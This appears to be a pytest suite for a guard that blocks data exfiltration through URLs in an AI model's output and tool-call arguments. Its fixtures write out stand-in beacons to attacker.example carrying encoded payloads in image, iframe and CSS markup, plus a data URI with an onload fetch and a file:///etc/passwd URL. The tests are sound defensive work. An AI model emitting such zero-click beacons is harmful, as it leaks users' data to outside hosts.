"""
Side-channel exfiltration through URLs in generated output.

The threat these cover is not "the model said something it shouldn't" — the
output guard handles that — but "the model emitted markup that makes the
user's own client send data somewhere on render". So the assertions are
mostly about two things: whether a URL is fetched without a click, and
whether it is carrying data rather than naming a resource.
"""

from __future__ import annotations

import pytest

from llm_security_pipeline.services.exfil_guard import (
    ExfilAttemptBlocked,
    ExfilGuard,
    ExfilPolicy,
    shannon_entropy,
)

BEACON = "https://attacker.example/p.png?d=c2stbGl2ZS1hYmMxMjM0NTY3ODkwMTI"
# Same beacon shape, but a payload that is long rather than high-entropy:
# the base64 one above also matches the output guard's generic-secret
# pattern, which would mask which guard did the blocking.
DULL_BEACON = "https://attacker.example/p.png?d=" + "a1b2" * 40


@pytest.fixture
def guard() -> ExfilGuard:
    return ExfilGuard()


@pytest.fixture
def allowlisted() -> ExfilGuard:
    return ExfilGuard(allowed_hosts=["cdn.mycorp.com", "mycorp.com"])


# ---------------------------------------------------------------------------
# Zero-click channels
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("text", [
    f"Here is your summary: ![]({BEACON})",
    f'<img src="{BEACON}">',
    f'<iframe src="{BEACON}"></iframe>',
    f'<video poster="{BEACON}"></video>',
    f'<source srcset="{BEACON} 2x">',
    f'<div style="background:url({BEACON})">',
    f"![alt][ref]\n\n[ref]: {BEACON}",
])
def test_auto_fetch_beacons_are_blocked(guard, text):
    result = guard.scan(text)
    assert result.blocked
    assert BEACON not in result.neutralized_text


def test_click_required_link_is_stripped_but_not_blocked(guard):
    """The user is still in the loop, so the message survives — minus the
    destination."""
    result = guard.scan(f"Full report [here]({BEACON}).")
    assert not result.blocked
    assert BEACON not in result.neutralized_text
    assert "here" in result.neutralized_text


def test_ordinary_output_is_untouched(guard):
    text = "See the [documentation](https://docs.example.com/guide) for details."
    result = guard.scan(text)
    assert not result.blocked
    assert result.neutralized_text == text


def test_plain_image_without_a_payload_is_not_flagged(guard):
    """Without an allowlist there is nothing to distinguish this from any
    other image, and flagging it would make the guard unusable."""
    result = guard.scan("![chart](https://cdn.example.com/q3/chart.png)")
    assert not result.blocked
    assert result.findings and not result.findings[0].suspicious


# ---------------------------------------------------------------------------
# Payload shape
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("url,reason", [
    ("https://x.example/p?d=c2VjcmV0dmFsdWVoZXJlMTIzNDU2Nzg5", "encoded_payload"),
    ("https://x.example/p?d=" + "a1b2" * 40, "long_query"),
    ("https://x.example/" + "4f8a2c91d7e3b6a5f0c8e2d4" + ".png", "encoded_payload"),
    ("https://x.example/p#c2VjcmV0dmFsdWVoZXJlMTIzNDU2Nzg5", "encoded_payload"),
    ("data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImZldGNoKCkiPjwvc3ZnPg==", "data_uri"),
    ("https://user:hunter2@x.example/p.png", "credentials_in_url"),
    ("file:///etc/passwd", "denied_scheme:file"),
])
def test_payload_shapes_are_recognised(guard, url, reason):
    result = guard.scan(f"![]({url})")
    assert reason in result.reasons


def test_percent_encoding_does_not_hide_the_payload(guard):
    plain = "c2VjcmV0dmFsdWVoZXJlMTIzNDU2Nzg5"
    encoded = "".join(f"%{ord(c):02x}" for c in plain)
    assert guard.scan(f"![](https://x.example/p?d={encoded})").blocked


def test_entropy_separates_a_payload_from_a_caption():
    assert shannon_entropy("the quarterly revenue report") < 4.0
    assert shannon_entropy("c2stbGl2ZS1hYmMxMjM0NTY3ODkwMTIzNDU2") > 4.0
    assert shannon_entropy("") == 0.0


# ---------------------------------------------------------------------------
# Allowlist
# ---------------------------------------------------------------------------

def test_offlist_auto_fetch_is_blocked_on_shape_alone(allowlisted):
    """The version of this defence that survives a careful attacker: no
    payload heuristic has to fire."""
    result = allowlisted.scan("![](https://totally-normal.example/logo.png)")
    assert result.blocked
    assert "off_allowlist" in result.reasons


def test_allowlisted_host_passes(allowlisted):
    assert not allowlisted.scan("![](https://cdn.mycorp.com/logo.png)").blocked


def test_allowlist_covers_subdomains(allowlisted):
    assert not allowlisted.scan("![](https://images.mycorp.com/logo.png)").blocked


def test_allowlist_is_not_fooled_by_a_suffix_match(allowlisted):
    """`evil-mycorp.com` ends with the allowed string but is not a
    subdomain of it."""
    assert allowlisted.scan("![](https://evil-mycorp.com/logo.png)").blocked


def test_relative_urls_are_configurable(allowlisted):
    assert not allowlisted.scan("![](/static/logo.png)").blocked
    strict = ExfilGuard(policy=ExfilPolicy(
        allowed_hosts=frozenset({"mycorp.com"}), allow_relative=False,
    ))
    assert strict.scan("![](/static/logo.png)").blocked


def test_policy_and_allowlist_are_mutually_exclusive():
    with pytest.raises(ValueError):
        ExfilGuard(allowed_hosts=["a.com"], policy=ExfilPolicy())


# ---------------------------------------------------------------------------
# Neutralisation
# ---------------------------------------------------------------------------

def test_neutralisation_removes_the_whole_construct(guard):
    """Stripping only the URL would leave an image node behind, and a
    renderer handed an empty src can still issue a request."""
    result = guard.scan(f"Before ![alt]({BEACON}) after")
    assert "![" not in result.neutralized_text
    assert "Before" in result.neutralized_text and "after" in result.neutralized_text


def test_several_findings_are_all_removed(guard):
    text = f"![a]({BEACON}) and ![b]({BEACON}) and ![c]({BEACON})"
    result = guard.scan(text)
    assert "attacker.example" not in result.neutralized_text


def test_a_url_is_reported_once(guard):
    """The bare-URL pattern also sees the URL inside `![](...)`; precedence
    filtering keeps it from being counted twice."""
    result = guard.scan(f"![]({BEACON})")
    assert len(result.findings) == 1
    assert result.findings[0].channel == "markdown_image"


# ---------------------------------------------------------------------------
# Tool arguments
# ---------------------------------------------------------------------------

def test_tool_arguments_are_walked_recursively(guard):
    findings = guard.scan_values({
        "action": "http_get",
        "options": {"targets": [BEACON], "retries": 3},
    })
    assert findings and findings[0].url == BEACON


def test_clean_tool_arguments_produce_nothing(guard):
    assert guard.scan_values({"query": "quarterly revenue", "limit": 10}) == []


def test_exception_names_the_reasons(guard):
    findings = guard.scan_values([BEACON])
    exc = ExfilAttemptBlocked(findings)
    assert "encoded_payload" in str(exc)


# ---------------------------------------------------------------------------
# Through the pipeline
# ---------------------------------------------------------------------------

async def test_post_process_blocks_a_beacon():
    from llm_security_pipeline import SecurityPipeline

    async with SecurityPipeline(system_prompt="internal prompt") as pipeline:
        result = await pipeline.post_process(f"Done! ![]({BEACON})")
        assert result.blocked
        assert BEACON not in result.safe_text
        assert result.exfil is not None and result.exfil.blocked


async def test_post_process_neutralises_without_blocking():
    """A click-required link carrying a low-entropy but oversized payload:
    the output guard has nothing to say about it, and the exfil guard
    strips the destination without killing the reply."""
    from llm_security_pipeline import SecurityPipeline

    padded = "https://x.example/p?d=" + "a1b2" * 40
    async with SecurityPipeline() as pipeline:
        result = await pipeline.post_process(f"Read [more]({padded}).")
        assert not result.blocked
        assert padded not in result.safe_text
        assert "more" in result.safe_text


async def test_post_process_scans_after_redaction():
    """A secret already replaced by the output guard must not be re-reported
    as an exfil payload."""
    from llm_security_pipeline import SecurityPipeline

    async with SecurityPipeline() as pipeline:
        result = await pipeline.post_process("Contact me at test.user@example.com")
        assert not result.blocked
        assert "REDACTED" in result.safe_text


async def test_tool_call_with_a_beacon_argument_is_refused():
    from llm_security_pipeline import SecurityPipeline

    async def fetch(url: str) -> str:  # pragma: no cover - must not run
        raise AssertionError("the tool should never have been invoked")

    async with SecurityPipeline() as pipeline:
        token = pipeline.scope_guard.issue_token(agent_id="a", scopes=["fetch"], ttl_seconds=60)
        with pytest.raises(ExfilAttemptBlocked):
            await pipeline.authorized_tool_call(token, "fetch", fetch, url=BEACON)


async def test_tool_argument_scanning_can_be_disabled():
    from llm_security_pipeline import SecurityPipeline

    async def fetch(url: str) -> str:
        return "fetched"

    async with SecurityPipeline(scan_tool_call_arguments=False) as pipeline:
        token = pipeline.scope_guard.issue_token(agent_id="a", scopes=["fetch"], ttl_seconds=60)
        assert await pipeline.authorized_tool_call(token, "fetch", fetch, url=BEACON) == "fetched"


# ---------------------------------------------------------------------------
# Switches
# ---------------------------------------------------------------------------

async def test_output_scanning_can_be_disabled():
    from llm_security_pipeline import SecurityPipeline

    async with SecurityPipeline(scan_output_for_exfil=False) as pipeline:
        result = await pipeline.post_process(f"Here: ![]({DULL_BEACON})")
        assert not result.blocked
        assert result.exfil is None
        assert DULL_BEACON in result.safe_text


async def test_disabling_output_scanning_leaves_redaction_working():
    """The two output defences are independent: turning off the URL scan
    must not turn off secret redaction."""
    from llm_security_pipeline import SecurityPipeline

    async with SecurityPipeline(scan_output_for_exfil=False) as pipeline:
        result = await pipeline.post_process("Reach me at test.user@example.com")
        assert "REDACTED" in result.safe_text


async def test_the_two_switches_are_independent():
    """One integration point can be off while the other is on — the
    asymmetry this flag exists to remove was that only one of them had a
    switch at all."""
    from llm_security_pipeline import SecurityPipeline

    async def fetch(url: str) -> str:
        return "fetched"

    async with SecurityPipeline(
        scan_output_for_exfil=False, scan_tool_call_arguments=True,
    ) as pipeline:
        token = pipeline.scope_guard.issue_token(agent_id="a", scopes=["fetch"], ttl_seconds=60)
        assert DULL_BEACON in (await pipeline.post_process(f"![]({DULL_BEACON})")).safe_text
        with pytest.raises(ExfilAttemptBlocked):
            await pipeline.authorized_tool_call(token, "fetch", fetch, url=BEACON)

    async with SecurityPipeline(
        scan_output_for_exfil=True, scan_tool_call_arguments=False,
    ) as pipeline:
        token = pipeline.scope_guard.issue_token(agent_id="a", scopes=["fetch"], ttl_seconds=60)
        assert (await pipeline.post_process(f"![]({DULL_BEACON})")).blocked
        assert await pipeline.authorized_tool_call(token, "fetch", fetch, url=BEACON) == "fetched"
